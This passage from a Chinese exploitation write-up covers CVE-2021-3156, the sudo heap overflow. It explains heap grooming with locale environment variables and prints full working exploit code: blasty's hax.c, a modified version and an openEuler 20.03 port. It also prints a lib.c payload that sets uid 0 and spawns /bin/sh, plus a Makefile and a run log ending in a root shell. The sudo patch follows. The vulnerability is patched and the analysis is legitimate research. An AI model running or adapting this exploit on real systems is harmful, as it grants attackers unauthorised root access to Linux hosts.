那么这里的`free`原语就出来了，假如我们想要设置`n`个`size`大小的堆块，那么就设置`n`个环境变量（这里注意顺序，环境变量从后向前开始加载），环境变量的值为`C.UTF-8[@len](https://github.com/len
"@len")`，其中`len`的大小满足`> size-0x20 & < size-0x10`。

这里需要注意的一个问题就是，在进行环境变量加载的过程中会对于每一个不同`size`的堆块，都会释放一个`size+0x10`大小的堆块，这是路径拼接造成的。但是相同`size`大小的会复用同一个堆块，因此在`tcache`中不同`size`大小的堆块只会额外产生`1`个`size+0x10`大小的堆块。需要注意的是对于`size`比较小的堆块，由于`getlocale`中堆块的申请比较多，因此可能会被申请回去，目前可以肯定的是对于`0x80`或者大于`0x80`的附加堆块会保存在`tcache`中。

    
    
    pwndbg> heapinfo
    (0x20)     fastbin[0]: 0x0
    (0x30)     fastbin[1]: 0x0
    (0x40)     fastbin[2]: 0x0
    (0x50)     fastbin[3]: 0x0
    (0x60)     fastbin[4]: 0x0
    (0x70)     fastbin[5]: 0x0
    (0x80)     fastbin[6]: 0x0
    (0x90)     fastbin[7]: 0x0
    (0xa0)     fastbin[8]: 0x0
    (0xb0)     fastbin[9]: 0x0
                      top: 0x555555582580 (size : 0x1da80)
           last_remainder: 0x5555555814b0 (size : 0xf90)
                unsortbin: 0x5555555814b0 (size : 0xf90)
    (0x20)   tcache_entry[0](1): 0x5555555814a0
    (0x40)   tcache_entry[2](3): 0x55555557ff40 --> 0x555555580620 --> 0x555555581380// group files
    (0x70)   tcache_entry[5](1): 0x555555580cb0 // 环境变量释放产生的0x70堆块
    (0x80)   tcache_entry[6](1): 0x555555580a90 // user_args堆块，是附加堆块
    (0x1e0)   tcache_entry[28](1): 0x55555557f2a0
    (0x410)   tcache_entry[63](1): 0x55555557f500
    

这里由于`ubuntu 20.04`下面我在调试的时候`execve`执行之后`sudo
main`函数执行之前就会有一个`0x80`的堆块，不知道什么原因，因此这里直接释放`0x80`的堆块会有问题，因此这里我是用附加堆块来实现`0x80`大小的堆块的效果。

拿到上述的堆布局之后就可以将`user_args`长度设置为`0x80`，申请得到`0x555555580a90`堆块，之后就可以覆写`0x555555581380`的`group
files service_user`结构体了。

这里我们看到堆块之间的差值是`0x8f0`，我们需要覆写这些长度。中间这些堆块都是在进行`setlocale`中产生的，对之后的程序进行没有影响，可以直接覆写。根据之前溢出的规则，遇到`\\`就会继续向后读。目前`exp`中参数设置如下

    
    
    "sudoedit", "-s", smash_a, "\\", smash_b, NULL, envp
    

参数和环境变量在内存中的表现方式如下

    
    
    // argv->0x7ffc304d1a18
    pwndbg> telescope 0x7ffc304d1a18
    00:0000│ rdx  0x7ffc304d1a18 —▸ 0x7ffc304d1df6 ◂— 'sudoedit'
    01:0008│      0x7ffc304d1a20 —▸ 0x7ffc304d1dff ◂— 0x414141414100732d /* '-s' */
    02:0010│      0x7ffc304d1a28 —▸ 0x7ffc304d1e02 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\'
    03:0018│      0x7ffc304d1a30 —▸ 0x7ffc304d1e3c ◂— 0x424242424242005c /* '\\' */
    04:0020│      0x7ffc304d1a38 —▸ 0x7ffc304d1e3e ◂— 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\\'
    05:0028│      0x7ffc304d1a40 ◂— 0x0
    06:0030│      0x7ffc304d1a48 —▸ 0x7ffc304d1e76 ◂— 0x5c005c005c005c /* '\\' */
    07:0038│      0x7ffc304d1a50 —▸ 0x7ffc304d1e78 ◂— 0x5c005c005c005c /* '\\' */
    //...
    pwndbg>
    40:0200│   0x7ffc304d1c18 —▸ 0x7ffc304d1eea ◂— 0x5c005c005c005c /* '\\' */
    41:0208│   0x7ffc304d1c20 —▸ 0x7ffc304d1eec ◂— 0x5c005c005c005c /* '\\' */
    42:0210│   0x7ffc304d1c28 —▸ 0x7ffc304d1eee ◂— 0x2f58005c005c005c /* '\\' */
    43:0218│   0x7ffc304d1c30 —▸ 0x7ffc304d1ef0 ◂— 0x30502f58005c005c /* '\\' */
    44:0220│   0x7ffc304d1c38 —▸ 0x7ffc304d1ef2 ◂— 0x5f5030502f58005c /* '\\' */
    45:0228│   0x7ffc304d1c40 —▸ 0x7ffc304d1ef4 ◂— 'X/P0P_SH3LLZ_'
    46:0230│   0x7ffc304d1c48 —▸ 0x7ffc304d1f02 ◂— 0x433d4c4c415f434c ('LC_ALL=C')
    47:0238│   0x7ffc304d1c50 ◂— 0x0
    

需要注意的是栈中每一个参数的结尾依靠的是`\\`。首先第一次复制，遇到`\\`会将`\\, smash_b,
envp`拷贝一遍，然后是第二次复制，参数即为`\\`因此会将`smash_b,envp`拷贝一遍，接着是`smash_b`，由于`smash_b`之后也是`\\`，因此会一直继续拷贝，也就是将`envp`拷贝了一遍。借着就结束拷贝了。也就是说`smash_b,envp`都被拷贝了三遍，`smash_a`被拷贝了一遍。注意到每一次拷贝结束都会在结尾处加`space`即空格（最后一个空格会被覆写为`0`）。在设定`smash_a,smash_b,envp`的长度的时候基本就是`user_args/2`即为`smash_a,smash_b`的值，剩余的值`/3`就是`envp`的长度，不够的话再用`smash_a`的长度进行微调。

当我们覆写完毕`group
service_user`结构体的`name`字段之后，`sudo`会经过一系列的调用直到`nss_load_library`最终打开`getshell`的动态链接库。

关于动态链接库编译有无空格的问题，如果是精准覆写`name`，那么就不需要空格，因为之后会被覆写为`0`，否则就需要空格。

![](https://p5.ssl.qhimg.com/t01b9680e709fa50e15.png)

## EXP

    
    
    /**
     ** CVE-2021-3156 PoC by blasty <peter@haxx.in>
     ** ===========================================
     **
     ** Exploit for that sudo heap overflow thing everyone is talking about.
     ** This one aims for singleshot. Does not fuck with your system files.
     ** No warranties.
     **
     ** Shout outs to:
     **   Qualys      - for pumping out the awesome bugs
     **   lockedbyte  - for coop hax. (shared tmux gdb sessions ftw)
     **   dsc         - for letting me rack up his electricity bill
     **   my wife     - for all the quality time we had to skip
     **
     **  Enjoy!
     **
     **   -- blasty // 20210130
     **/
    
    #include <stdio.h>
    #include <string.h>
    #include <stdlib.h>
    #include <stdint.h>
    #include <unistd.h>
    #include <ctype.h>
    
    // 512 environment variables should be enough for everyone
    #define MAX_ENVP 0x1000
    
    typedef struct {
            char *target_name;
            char *sudoedit_path;
            uint32_t smash_len_a;
            uint32_t smash_len_b;
            uint32_t null_stomp_len;
            uint32_t lc_all_len;
    } target_t;
    
    char *lc_names[]={
            "LC_COLLATE",
            "LC_CTYPE",
            "LC_MONETARY",
            "LC_NUMERIC",
            "LC_TIME",
            "LC_MESSAGES",
            "LC_PAPER",
            "LC_NAME",
            "LC_ADDRESS",
            "LC_TELEPHONE",
            "LC_MEASUREMENT",
            "LC_IDENTIFICATION"
    };
    
    target_t targets[] = {
        {
            // Yes, same values as 20.04.1, but also confirmed.
            .target_name    = "Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27",
            .sudoedit_path  = "/usr/bin/sudoedit",
            .smash_len_a    = 58,
            .smash_len_b    = 54,
            .null_stomp_len = 63,
            .lc_all_len     = 0x30
            // .lc_all_len     = 212
        },
        {
            .target_name    = "Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31",
            .sudoedit_path  = "/usr/bin/sudoedit",
            .smash_len_a    = 58,
            .smash_len_b    = 54,
            .null_stomp_len = 63,
            .lc_all_len     = 212
        },
        {
            .target_name    = "Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28",
            .sudoedit_path  = "/usr/bin/sudoedit",
            .smash_len_a    = 64,
            .smash_len_b    = 49,
            .null_stomp_len = 60,
            .lc_all_len     = 214
        }
    };
    
    void usage(char *prog) {
        printf("  usage: %s <target>\n\n", prog);
        printf("  available targets:\n");
        printf("  ------------------------------------------------------------\n");
        for(int i = 0; i < sizeof(targets) / sizeof(target_t); i++) {
            printf("    %d) %s\n", i, targets[i].target_name);
        }
        printf("  ------------------------------------------------------------\n");
        printf("\n");
    }
    
    int main(int argc, char *argv[]) {
        printf("\n** CVE-2021-3156 PoC by blasty <peter@haxx.in>\n\n");
    
        if (argc != 2) {
            usage(argv[0]);
            return -1;
        }
    
        int target_idx = atoi(argv[1]);
    
        if (target_idx < 0 || target_idx >= (sizeof(targets) / sizeof(target_t))) {
            fprintf(stderr, "invalid target index\n");
            return -1;
        }
    
        target_t *target = &targets[ target_idx ];
    
        printf("using target: '%s'\n", target->target_name);
    
        char *smash_a = calloc(target->smash_len_a + 2, 1);
        char *smash_b = calloc(target->smash_len_b + 2, 1);
    
        memset(smash_a, 'A', target->smash_len_a);
        memset(smash_b, 'B', target->smash_len_b);
    
        smash_a[target->smash_len_a] = '\\';
        smash_b[target->smash_len_b] = '\\';
    
        char *s_argv[]={
            // "sudoedit", "-s", smash_a, "\\", NULL
            // "sudoedit", "-s", smash_a, NULL
            "sudoedit", "-s", smash_a, "\\", smash_b, NULL
        };
    
        char *s_envp[MAX_ENVP];
        int envp_pos = 0;
    
        for(int i = 0; i < (0x2b6); i++) {
            s_envp[envp_pos++] = "\\";
        }
        s_envp[envp_pos++] = "X/P0P_SH3LLZ_";
    
        int lc_len = 0x20;
        int lc_num = 2;
    
        int i = 0;
        char *temp=NULL;
    
        for(i = 11; i > (11 - lc_num); i--){
            temp = calloc(lc_len + strlen(lc_names[i]) + 10, 1);
            strcpy(temp, lc_names[i]);
            strcpy(temp + strlen(lc_names[i]), "=C.UTF-8@");
            memset(temp+strlen(lc_names[i]) + 9, 'A'+i, lc_len);
            s_envp[envp_pos++] = temp;
        }
        temp = calloc(0x50 + strlen(lc_names[i]) + 10, 1);
        strcpy(temp, lc_names[i]);
        strcpy(temp + strlen(lc_names[i]), "=C.UTF-8@");
        memset(temp+strlen(lc_names[i]) + 9, 'A'+i, 0x50);
        s_envp[envp_pos++] = temp;
    
        i -= 1;
        // temp = calloc(0x60 + strlen(lc_names[i]) + 10, 1);
        // strcpy(temp, lc_names[i]);
        // strcpy(temp + strlen(lc_names[i]), "=C.UTF-8@");
        // memset(temp+strlen(lc_names[i]) + 9, 'A'+i, 0x60);
        // s_envp[envp_pos++] = temp;
        //
        // i -= 1;
    
        temp = calloc(lc_len + strlen(lc_names[i]) + 10, 1);
        strcpy(temp, lc_names[i]);
        strcpy(temp + strlen(lc_names[i]), "=C.UTF-8@");
        memset(temp+strlen(lc_names[i]) + 9, 'A'+i, lc_len);
        s_envp[envp_pos++] = temp;
        i-=1;
    
        temp = calloc(lc_len + strlen(lc_names[i]) + 10, 1);
        strcpy(temp, lc_names[i]);
        strcpy(temp + strlen(lc_names[i]), "=XXXXXXXX");
        memset(temp+strlen(lc_names[i]) + 9, 'A'+i, lc_len);
        s_envp[envp_pos++] = temp;
    
        s_envp[envp_pos++] = NULL;
    
        printf("** pray for your rootshell.. **\n");
    
        execve(target->sudoedit_path, s_argv, s_envp);
        // execve(target->sudoedit_path, s_argv, NULL);
        return 0;
    }
    

这里的`exp`与原始的`exp`不同，原始的`exp`是用`LC_ALL`此时会在`sudo_conf_read`函数中调用`setlocale(LC_ALL,
"C"),setlocale(LC_ALL,
prev_locale)`会申请和释放大量的堆块，此时也会释放`_nl_global_locale.__names`中保存的堆块地址其实就是`newnames`中的堆块地址也就是存储我们环境变量值的堆块，通过释放大量的`0xf0`堆块进入`unsorted
bin`，然后再申请`0x20`的时候，制造一个`0xd0`大小的`small bin`。此时还会有一个`unsorted
bin`，由于在`get_user_info`会申请一个`0x80,0x1000`的堆块，此时`small bin,unsorted
bin`会互换位置，也就是`0x80`大小的堆块和`group files service_user`会在`unsorted
bin`相邻的位置申请，非常的巧妙。

初始的`exp`，`lib`，`Makefile`如下

    
    
    //hax.c
    /**
     ** CVE-2021-3156 PoC by blasty <peter@haxx.in>
     ** ===========================================
     **
     ** Exploit for that sudo heap overflow thing everyone is talking about.
     ** This one aims for singleshot. Does not fuck with your system files.
     ** No warranties.
     **
     ** Shout outs to:
     **   Qualys      - for pumping out the awesome bugs
     **   lockedbyte  - for coop hax. (shared tmux gdb sessions ftw)
     **   dsc         - for letting me rack up his electricity bill
     **   my wife     - for all the quality time we had to skip
     **
     **  Enjoy!
     **
     **   -- blasty // 20210130
     **/
    
    #include <stdio.h>
    #include <string.h>
    #include <stdlib.h>
    #include <stdint.h>
    #include <unistd.h>
    #include <ctype.h>
    
    // 512 environment variables should be enough for everyone
    #define MAX_ENVP 512
    
    typedef struct {
        char *target_name;
        char *sudoedit_path;
        uint32_t smash_len_a;
        uint32_t smash_len_b;
        uint32_t null_stomp_len;
        uint32_t lc_all_len; 
    } target_t;
    
    target_t targets[] = {
        {
            // Yes, same values as 20.04.1, but also confirmed.
            .target_name    = "Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27",
            .sudoedit_path  = "/usr/bin/sudoedit",
            .smash_len_a    = 56,
            .smash_len_b    = 54,
            .null_stomp_len = 63, 
            .lc_all_len     = 212
        },
        {
            .target_name    = "Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31",
            .sudoedit_path  = "/usr/bin/sudoedit",
            .smash_len_a    = 56,
            .smash_len_b    = 54,
            .null_stomp_len = 63, 
            .lc_all_len     = 212
        },
        {
            .target_name    = "Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28",
            .sudoedit_path  = "/usr/bin/sudoedit",
            .smash_len_a    = 64,
            .smash_len_b    = 49,
            .null_stomp_len = 60, 
            .lc_all_len     = 214
        }
    };
    
    void usage(char *prog) {
        printf("  usage: %s <target>\n\n", prog);
        printf("  available targets:\n");
        printf("  ------------------------------------------------------------\n");
        for(int i = 0; i < sizeof(targets) / sizeof(target_t); i++) {
            printf("    %d) %s\n", i, targets[i].target_name);
        }
        printf("  ------------------------------------------------------------\n");
        printf("\n");
    }
    
    int main(int argc, char *argv[]) {
        printf("\n** CVE-2021-3156 PoC by blasty <peter@haxx.in>\n\n");
    
        if (argc != 2) {
            usage(argv[0]);
            return -1;
        }
    
        int target_idx = atoi(argv[1]);
    
        if (target_idx < 0 || target_idx >= (sizeof(targets) / sizeof(target_t))) {
            fprintf(stderr, "invalid target index\n");
            return -1;
        }
    
        target_t *target = &targets[ target_idx ];
    
        printf("using target: '%s'\n", target->target_name);
    
        char *smash_a = calloc(target->smash_len_a + 2, 1);
        char *smash_b = calloc(target->smash_len_b + 2, 1);
    
        memset(smash_a, 'A', target->smash_len_a);
        memset(smash_b, 'B', target->smash_len_b);
    
        smash_a[target->smash_len_a] = '\\';
        smash_b[target->smash_len_b] = '\\';
    
        char *s_argv[]={
            "sudoedit", "-s", smash_a, "\\", smash_b, NULL
        };
    
        char *s_envp[MAX_ENVP];
        int envp_pos = 0;
    
        for(int i = 0; i < target->null_stomp_len; i++) {
            s_envp[envp_pos++] = "\\";
        }
        s_envp[envp_pos++] = "X/P0P_SH3LLZ_";
    
        char *lc_all = calloc(target->lc_all_len + 16, 1);
        strcpy(lc_all, "LC_ALL=C.UTF-8@");
        memset(lc_all+15, 'C', target->lc_all_len);
    
        s_envp[envp_pos++] = lc_all;
        s_envp[envp_pos++] = NULL;
    
        printf("** pray for your rootshell.. **\n");
    
        execve(target->sudoedit_path, s_argv, s_envp);
        return 0;
    }
    
    
    
    //lib.c
    #include <unistd.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    
    static void __attribute__ ((constructor)) _init(void);
    
    static void _init(void) {
        printf("[+] bl1ng bl1ng! We got it!\n");
        setuid(0); seteuid(0); setgid(0); setegid(0);
        static char *a_argv[] = { "sh", NULL };
        static char *a_envp[] = { "PATH=/bin:/usr/bin:/sbin", NULL };
        execv("/bin/sh", a_argv);
    }
    
    
    
    all:
        rm -rf libnss_X
        mkdir libnss_X
        gcc -o sudo-hax-me-a-sandwich hax.c
        gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_.so.2' lib.c
    clean:
        rm -rf libnss_X sudo-hax-me-a-sandwich
    

## For open euler 20.03

系统类似于`centos`，我们看一下`/etc/nsswitch.conf`即配置文件

    
    
    passwd:      sss files systemd
    shadow:     files sss
    group:       sss files systemd
    
    hosts:      files dns myhostname
    
    bootparams: files
    
    ethers:     files
    netmasks:   files
    networks:   files
    protocols:  files
    rpc:        files
    services:   files sss
    
    netgroup:   sss
    
    publickey:  files
    
    automount:  files sss
    aliases:    files
    

可以看到这里的顺序和服务规范和`ubuntu`下面不一样，因此这里的堆布局与`ubuntu`也不相同。我们先看一下系统的调用逻辑是否发生了改变。经过调试发现其调用逻辑与`ubuntu`下相同

我们将`ni`结构体手动修改如下

    
    
    pwndbg> p *ni
    $4 = {
      next = 0x0,
      actions = {NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE},
      library = 0x555555582be0,
      known = 0x555555592b30,
      name = 0x5555555861a0 "X/P0P_SH3LLZ_ "
    }
    pwndbg> p shlib_name
    $5 = 0x7fffffffdeb0 "libnss_X/P0P_SH3LLZ_ .so.2"
    

![](https://p0.ssl.qhimg.com/t0101be57f2464a08e7.png)

经过手动修改的`ni`结构体，这里继续执行就会`getshell`。

    
    
    pwndbg> c
    Continuing.
    [+] bl1ng bl1ng! We got it!
    process 123212 is executing new program: /usr/bin/bash
    Error in re-setting breakpoint 2: No source file named sudo.c.
    Error in re-setting breakpoint 3: No source file named sudo.c.
    Error in re-setting breakpoint 4: No source file named sudo.c.
    

那么接下来的问题就是如何复习这个结构体了，与`ubuntu`覆写`files service_user`不同，这里需要覆写的是`sss
service_user`结构体，但是两者没有本质的区别都是`group`的第一个结构体，唯一不同的就是分配到`group`服务规范的结构体之前`get_user_info`所分配的堆块的数量，我们调试一下

    
    
    malloc(0x100)
    malloc(0x400)
    malloc(0x228) // tcache
    malloc(0x10)
    malloc(0x78)// 目标0x80堆块
    malloc(0x1000)
    malloc(0x17) // 开始为passwd分配service_user // tcache
    malloc(0x34)
    malloc(0x36)
    malloc(0x38)
    malloc(0x17) // 开始为shadow分配service_user
    malloc(0x36)
    malloc(0x34)
    malloc(0x16)// 开始为group分配service_user
    malloc(0x34)// 这里就是sss service_user的结构体
    

这里我们需要提前布置`6`个`0x40`大小的堆块，和一个`0xc0`大小的堆块（这里布置`0x80`的堆块不合适，因为之后会被申请并更换为高地址的`0x80`堆块，经过测试`0xc0`大小的堆块可以。）

###  EXP

    
    
    /**
     ** CVE-2021-3156 PoC by blasty <peter@haxx.in>
     ** ===========================================
     **
     ** Exploit for that sudo heap overflow thing everyone is talking about.
     ** This one aims for singleshot. Does not fuck with your system files.
     ** No warranties.
     **
     ** Shout outs to:
     **   Qualys      - for pumping out the awesome bugs
     **   lockedbyte  - for coop hax. (shared tmux gdb sessions ftw)
     **   dsc         - for letting me rack up his electricity bill
     **   my wife     - for all the quality time we had to skip
     **
     **  Enjoy!
     **
     **   -- blasty // 20210130
     **/
    
    #include <stdio.h>
    #include <string.h>
    #include <stdlib.h>
    #include <stdint.h>
    #include <unistd.h>
    #include <ctype.h>
    
    // 512 environment variables should be enough for everyone
    #define MAX_ENVP 0x1000
    
    typedef struct {
        char *target_name;
        char *sudoedit_path;
        uint32_t smash_len_a;
        uint32_t smash_len_b;
        uint32_t null_stomp_len;
        uint32_t lc_all_len;
    } target_t;
    
    char *lc_names[]={
            "LC_COLLATE",
            "LC_CTYPE",
            "LC_MONETARY",
            "LC_NUMERIC",
            "LC_TIME",
            "LC_MESSAGES",
            "LC_PAPER",
            "LC_NAME",
            "LC_ADDRESS",
            "LC_TELEPHONE",
            "LC_MEASUREMENT",
            "LC_IDENTIFICATION"
    };
    
    target_t targets[] = {
        {
            // Yes, same values as 20.04.1, but also confirmed.
            .target_name    = "Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27",
            .sudoedit_path  = "/usr/bin/sudoedit",
            .smash_len_a    = 0x53,
            .smash_len_b    = 0x54,
            .null_stomp_len = 63,
            .lc_all_len     = 0x30
            // .lc_all_len     = 212
        },
        {
            .target_name    = "Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31",
            .sudoedit_path  = "/usr/local/bin/sudoedit",
            .smash_len_a    = 56,
            .smash_len_b    = 54,
            .null_stomp_len = 63,
            .lc_all_len     = 212
        },
        {
            .target_name    = "Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28",
            .sudoedit_path  = "/usr/bin/sudoedit",
            .smash_len_a    = 64,
            .smash_len_b    = 49,
            .null_stomp_len = 60,
            .lc_all_len     = 214
        },
        {
            // Yes, same values as 20.04.1, but also confirmed.
            .target_name    = "openEuler release 20.03 (LTS) - sudo 1.8.27, libc-2.28",
            .sudoedit_path  = "/usr/bin/sudoedit",
            .smash_len_a    = 0x53,
            .smash_len_b    = 0x54,
            .null_stomp_len = 0x185,
            .lc_all_len     = 0xa0
            // .lc_all_len     = 212
        },
    };
    
    void usage(char *prog) {
        printf("  usage: %s <target>\n\n", prog);
        printf("  available targets:\n");
        printf("  ------------------------------------------------------------\n");
        for(int i = 0; i < sizeof(targets) / sizeof(target_t); i++) {
            printf("    %d) %s\n", i, targets[i].target_name);
        }
        printf("  ------------------------------------------------------------\n");
        printf("\n");
    }
    
    int main(int argc, char *argv[]) {
        printf("\n** CVE-2021-3156 PoC by blasty <peter@haxx.in>\n\n");
    
        if (argc != 2) {
            usage(argv[0]);
            return -1;
        }
    
        int target_idx = atoi(argv[1]);
    
        if (target_idx < 0 || target_idx >= (sizeof(targets) / sizeof(target_t))) {
            fprintf(stderr, "invalid target index\n");
            return -1;
        }
    
        target_t *target = &targets[ target_idx ];
    
        printf("using target: '%s'\n", target->target_name);
    
        char *smash_a = calloc(target->smash_len_a + 2, 1);
        char *smash_b = calloc(target->smash_len_b + 2, 1);
    
        memset(smash_a, 'A', target->smash_len_a);
        memset(smash_b, 'B', target->smash_len_b);
    
        smash_a[target->smash_len_a] = '\\';
        smash_b[target->smash_len_b] = '\\';
    
        char *s_argv[]={
            // "sudoedit", "-s", smash_a, "\\", NULL
            // "sudoedit", "-s", smash_a, NULL
            "sudoedit", "-s", smash_a, "\\", smash_b, NULL
        };
    
        char *s_envp[MAX_ENVP];
        int envp_pos = 0;
    
        for(int i = 0; i < target->null_stomp_len; i++) {
            s_envp[envp_pos++] = "\\";
        }
        s_envp[envp_pos++] = "X/P0P_SH3LLZ_";
    
        int lc_len = 0x20;
        int lc_num = 0x5;
    
        int i = 0;
        char *temp=NULL;
    
        for(i = 11; i > (11 - lc_num); i--){
            temp = calloc(lc_len + strlen(lc_names[i]) + 10, 1);
            strcpy(temp, lc_names[i]);
            strcpy(temp + strlen(lc_names[i]), "=C.UTF-8@");
            memset(temp+strlen(lc_names[i]) + 9, 'A'+i, lc_len);
            s_envp[envp_pos++] = temp;
        }
        temp = calloc(target->lc_all_len + strlen(lc_names[i]) + 10, 1);
        strcpy(temp, lc_names[i]);
        strcpy(temp + strlen(lc_names[i]), "=C.UTF-8@");
        memset(temp+strlen(lc_names[i]) + 9, 'A'+i, target->lc_all_len);
        s_envp[envp_pos++] = temp;
    
        i -= 1;
        // temp = calloc(0x60 + strlen(lc_names[i]) + 10, 1);
        // strcpy(temp, lc_names[i]);
        // strcpy(temp + strlen(lc_names[i]), "=C.UTF-8@");
        // memset(temp+strlen(lc_names[i]) + 9, 'A'+i, 0x60);
        // s_envp[envp_pos++] = temp;
        //
        // i -= 1;
    
        temp = calloc(lc_len + strlen(lc_names[i]) + 10, 1);
        strcpy(temp, lc_names[i]);
        strcpy(temp + strlen(lc_names[i]), "=C.UTF-8@");
        memset(temp+strlen(lc_names[i]) + 9, 'A'+i, lc_len);
        s_envp[envp_pos++] = temp;
        i-=1;
    
        if (target_idx == 3){
            temp = calloc(0xd0 + strlen(lc_names[i]) + 10, 1);
            strcpy(temp, lc_names[i]);
            strcpy(temp + strlen(lc_names[i]), "=C.UTF-8@");
            memset(temp+strlen(lc_names[i]) + 9, 'A'+i, 0xd0);
            s_envp[envp_pos++] = temp;
    
            i -= 1;
        }
    
    
        temp = calloc(lc_len + strlen(lc_names[i]) + 10, 1);
        strcpy(temp, lc_names[i]);
        strcpy(temp + strlen(lc_names[i]), "=XXXXXXXX");
        memset(temp+strlen(lc_names[i]) + 9, 'A'+i, lc_len);
        s_envp[envp_pos++] = temp;
    
        s_envp[envp_pos++] = NULL;
    
        printf("** pray for your rootshell.. **\n");
    
        execve(target->sudoedit_path, s_argv, s_envp);
        // execve(target->sudoedit_path, s_argv, NULL);
        return 0;
    }
    
    
    
    [normal@172 CVE-2021-3156_blasty]$ ./sudo-hax-me-a-sandwich 3
    
    ** CVE-2021-3156 PoC by blasty <peter@haxx.in>
    
    using target: 'openEuler release 20.03 (LTS) - sudo 1.8.27, libc-2.28'
    ** pray for your rootshell.. **
    [+] bl1ng bl1ng! We got it!
    sh-5.0# exit
    exit
    

## Patch

[patch 049ad90590be](https://www.sudo.ws/repos/sudo/rev/049ad90590be)

    
    
    --- a/plugins/sudoers/sudoers.c    Sat Jan 23 08:43:59 2021 -0700
    +++ b/plugins/sudoers/sudoers.c    Sat Jan 23 08:43:59 2021 -0700
    @@ -547,7 +547,7 @@
    
         /* If run as root with SUDO_USER set, set sudo_user.pw to that user. */
         /* XXX - causes confusion when root is not listed in sudoers */
    -    if (sudo_mode & (MODE_RUN | MODE_EDIT) && prev_user != NULL) {
    +    if (ISSET(sudo_mode, MODE_RUN|MODE_EDIT) && prev_user != NULL) {
         if (user_uid == 0 && strcmp(prev_user, "root") != 0) {
             struct passwd *pw;
    
    @@ -932,8 +932,8 @@
         if (user_cmnd == NULL)
         user_cmnd = NewArgv[0];
    
    -    if (sudo_mode & (MODE_RUN | MODE_EDIT | MODE_CHECK)) {
    -    if (ISSET(sudo_mode, MODE_RUN | MODE_CHECK)) {
    +    if (ISSET(sudo_mode, MODE_RUN|MODE_EDIT|MODE_CHECK)) {
    +    if (!ISSET(sudo_mode, MODE_EDIT)) {
             const char *runchroot = user_runchroot;
             if (runchroot == NULL && def_runchroot != NULL &&
                 strcmp(def_runchroot, "*") != 0)
    @@ -961,7 +961,8 @@
             sudo_warnx(U_("%s: %s"), __func__, U_("unable to allocate memory"));
             debug_return_int(NOT_FOUND_ERROR);
             }
    -        if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) {
    +        if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL) &&
    +            ISSET(sudo_mode, MODE_RUN)) {
             /*
              * When running a command via a shell, the sudo front-end
              * escapes potential meta chars.  We unescape non-spaces
    @@ -969,10 +970,22 @@
              */
             for (to = user_args, av = NewArgv + 1; (from = *av); av++) {
                 while (*from) {
    -            if (from[0] == '\\' && !isspace((unsigned char)from[1]))
    +            if (from[0] == '\\' && from[1] != '\0' &&
    +                !isspace((unsigned char)from[1])) {
                     from++;
    +            }
    +            if (size - (to - user_args) < 1) {
    +                sudo_warnx(U_("internal error, %s overflow"),
    +                __func__);
    +                debug_return_int(NOT_FOUND_ERROR);
    +            }
                 *to++ = *from++;
                 }
    +            if (size - (to - user_args) < 1) {
    +            sudo_warnx(U_("internal error, %s overflow"),
    +                __func__);
    +            debug_return_int(NOT_FOUND_ERROR);
    +            }
                 *to++ = ' ';
             }
             *--to = '\0';
    

`patch`检查了参数是否以反斜杠结尾，并在拷贝过程中对溢出进行了检测。

## 补充

针对利用`1`，我这里没有调试出来，有大佬知道是咋回事嘛，23333

我调试过程中发现没有进入`process_hooks_getenv`的路径，看源码分析，`github`中的`exp`执行的是`SUDO_EDITOR`，从源码中来看应该是位于`find_editor`函数中

    
    
    char *
    find_editor(int nfiles, char **files, int *argc_out, char ***argv_out,
         char * const *whitelist, const char **env_editor, bool env_error)
    {
        char *ev[3], *editor_path = NULL;
        unsigned int i;
        debug_decl(find_editor, SUDOERS_DEBUG_UTIL)
    
        /*
         * If any of SUDO_EDITOR, VISUAL or EDITOR are set, choose the first one.
         */
        *env_editor = NULL;
        ev[0] = "SUDO_EDITOR";
        ev[1] = "VISUAL";
        ev[2] = "EDITOR";
        for (i = 0; i < nitems(ev); i++) {
        char *editor = getenv(ev[i]);
          //...
        }
    

而该函数在申请完`user_args`堆块之后的调用发现

    
    
    /* Require a password if sudoers says so.  */
    switch (check_user(validated, sudo_mode)) {
      case true:
        /* user authenticated successfully. */
        break;
      case false:
        /* Note: log_denial() calls audit for us. */
        if (!ISSET(validated, VALIDATE_SUCCESS)) {
          /* Only display a denial message if no password was read. */
          if (!log_denial(validated, def_passwd_tries <= 0))
            goto done;
        }
        goto bad;
      default:
        /* some other error, ret is -1. */
        goto done;
    }
    //...
    free(safe_cmnd);
    safe_cmnd = find_editor(NewArgc - 1, NewArgv + 1, &edit_argc,
                            &edit_argv, NULL, &env_editor, false);
    

但是该函数的调用是位于`check_user`函数之后的，该函数经过调试发现需要满足两个条件，一个是密码输入正确，另一个就是用户需要在`sudo`列表中，但是满足这个条件的话就不要提权了。

另外还有调用就是`visudo`和`plugin/sample`了。

原文章中写的环境变量为`SYSTEMD_BYPASS_USERDB`，搜索了一下该环境变量是位于`systemd`中，不知道怎么发生调用。所以现在卡住了。

## 参考

[区域设置](https://zh.wikipedia.org/wiki/%E5%8C%BA%E5%9F%9F%E8%AE%BE%E7%BD%AE)

[Sudo Heap-Based Buffer
Overflow](https://packetstormsecurity.com/files/161160/Sudo-Heap-Based-Buffer-Overflow.html)

[CVE-2021-3156 PoC](https://github.com/blasty/CVE-2021-3156)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **LYYL** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
